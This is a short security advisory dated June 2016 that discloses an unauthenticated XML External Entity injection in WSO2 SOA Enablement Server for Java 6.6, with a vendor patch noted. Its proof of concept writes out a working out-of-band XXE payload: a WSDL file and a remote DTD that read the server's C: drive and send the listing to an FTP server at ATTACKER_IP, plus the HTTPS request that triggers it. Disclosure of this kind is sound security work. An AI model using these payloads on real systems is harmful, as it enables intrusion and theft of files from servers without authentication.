Title: WSO2 SOA Enablement Server - XML External Entity Injection
Authors: Pawel Gocyla, Jakub Palaczynski
Date: 08. June 2016

Affected Software:
==================
WSO2 SOA Enablement Server for Java/6.6 build SSJ-6.6-20090827-1616

XML External Entity Injection:
==============================

It must be noted that this vulnerability is exploitable without
authentication.

Proof of Concept:
1. An attacker sets up web server that serves two files (wsdl.txt and
file.dtd):
wsdl.txt:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE m [ <!ENTITY % remote SYSTEM "http://ATTACKER_IP/file.dtd
">%remote;%int;%trick;]>
file.dtd:
<!ENTITY % payl SYSTEM "file:///C:/">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://ATTACKER_IP/%payl;'>">

2. An attacker sets up FTP server that logs every command executed on the
server.

3. An attacker sends request that triggers vulnerability:
https://WSO2SOA_IP:6443/invocationConsole?p.wsdlUrl=http://attacker_ip/wsdl.txt


FIX:
====

Patches were already released by the vendor.
